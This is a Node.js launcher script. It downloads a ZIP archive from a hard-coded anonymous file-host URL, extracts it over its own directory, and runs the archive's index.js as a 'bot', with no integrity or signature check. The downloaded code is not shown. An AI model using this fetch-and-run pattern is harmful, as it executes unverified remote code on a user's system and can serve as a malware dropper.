const fs = require('fs');
const path = require('path');
const axios = require('axios');
const AdmZip = require('adm-zip');
const { spawn } = require('child_process');

async function downloadAndExtractZip(zipUrl) {
  const zipPath = path.join(__dirname, 'temp.zip');
  const extractPath = __dirname;

  try {
    const response = await axios({
      method: 'GET',
      url: zipUrl,
      responseType: 'stream'
    });

    const writer = fs.createWriteStream(zipPath);
    response.data.pipe(writer);

    await new Promise((resolve, reject) => {
      writer.on('finish', resolve);
      writer.on('error', reject);
    });

    console.log('✅ ZIP downloaded.');

    const zip = new AdmZip(zipPath);
    zip.extractAllTo(extractPath, true);
    console.log('✅ ZIP extracted.');

    fs.unlinkSync(zipPath);
    console.log('🗑️ ZIP file deleted.');

    // 🔍 Find extracted folder
    const extractedFolder = fs.readdirSync(extractPath)
      .find(f => fs.statSync(path.join(extractPath, f)).isDirectory() && fs.existsSync(path.join(extractPath, f, 'index.js')));

    if (!extractedFolder) {
      console.error('❌ Could not find extracted folder with index.js');
      return;
    }

    const botPath = path.join(extractPath, extractedFolder, 'index.js');
    console.log(`🚀 Starting bot from ${botPath} ...`);

    const bot = spawn('node', [botPath], { stdio: 'inherit' });

    bot.on('exit', (code) => {
      console.log(`🔁 Bot exited with code: ${code}`);
    });

  } catch (err) {
    console.error('❌ Error during setup:', err);
  }
}

const zipUrl = 'https://files.catbox.moe/nosx6k.zip';
downloadAndExtractZip(zipUrl);
